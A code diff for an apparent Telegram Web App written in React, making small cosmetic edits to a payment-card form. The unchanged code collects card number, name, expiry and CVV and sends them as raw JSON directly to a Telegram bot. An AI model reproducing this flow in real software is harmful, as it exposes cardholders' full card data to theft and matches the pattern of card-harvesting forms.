@@ -1,4 +1,4 @@
-import { useCallback, useEffect, useState, forwardRef } from 'react';
+import { useCallback, useEffect, useState } from 'react';
 import './App.css';
 import { Box, Paper } from '@mui/material';
 import LockIcon from '@mui/icons-material/Lock';
@@ -25,10 +25,7 @@ function App() {
   // Snackbar
   const [openSnackbar, setOpenSnackbar] = useState(false);
   const [messageSnackbar, setMessageSnackbar] = useState('');
-  const handleCloseSnackbar = () => {
-    setOpenSnackbar(false);    
-  };
-
+  const handleCloseSnackbar = () => { setOpenSnackbar(false); };
   const handleOpenSnackbar = (message, divId, disableInfAnim) => {
     setMessageSnackbar(message);
     setOpenSnackbar(true);
@@ -37,7 +34,7 @@ function App() {
     if (disableInfAnim) {
       setTimeout(function() {
         div.classList.remove("pulsating-border");
-      }, 1000);
+      }, 1200);
     }
   };
 
@@ -51,13 +48,13 @@ function App() {
   }, [cardNumber, nameOnCard, expiryDate, cvv ])
 
   // SEND DATA to bot
-  // callback
+  //// callback
   const onSendData = useCallback(()=>{
     const cardNumberNoSpaces = cardNumber.replace(/\s/g, "")
     const data = { cardNumber: cardNumberNoSpaces, nameOnCard, expiryDate, cvv }
     tg.sendData(JSON.stringify(data))
   }, [cardNumber, nameOnCard, expiryDate, cvv])
-  // send
+  //// send
   useEffect(() => {
     tg.onEvent('mainButtonClicked', onSendData);
     return () => {tg.offEvent('mainButtonClicked', onSendData)}
